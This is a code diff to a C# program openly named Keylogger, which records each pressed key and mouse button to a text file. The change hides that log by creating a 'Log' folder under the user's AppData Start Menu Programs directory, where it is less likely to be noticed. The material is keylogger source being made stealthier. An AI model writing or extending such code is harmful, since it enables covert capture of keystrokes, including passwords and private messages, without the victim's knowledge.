@@ -1,4 +1,3 @@
-using System.Reflection;
 using System.Runtime.InteropServices;
 
 namespace Keylogger
@@ -14,8 +13,13 @@ namespace Keylogger
             // KeyPressed variable will store the name of the pressed key (or mouse button)
             // Example: [CAPS LOCK key] or [SHIFT key] or [A] or [Left mouse button]...
             string keyPressed = String.Empty;
-            // The variable path will store the directory where the application is running, because the log file will be there
-            string path = Path.GetDirectoryName(Assembly.GetExecutingAssembly().Location) + "\\Keylogger.txt";
+
+            // create a folder called log in the path "C:\Users\User\AppData\Roaming\Microsoft\Windows\Start Menu\Programs"...
+            // ...(this is where the Keylogger.txt file will be stored).
+            string username = Environment.UserName;
+            string logPath = $"C:\\Users\\{username}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Log";
+            Directory.CreateDirectory(logPath);
+            string path = logPath + "\\Keylogger.txt";
 
             // shows that the program has been started again
             File.AppendAllText(path, "\n--> New Record <--\n\n");
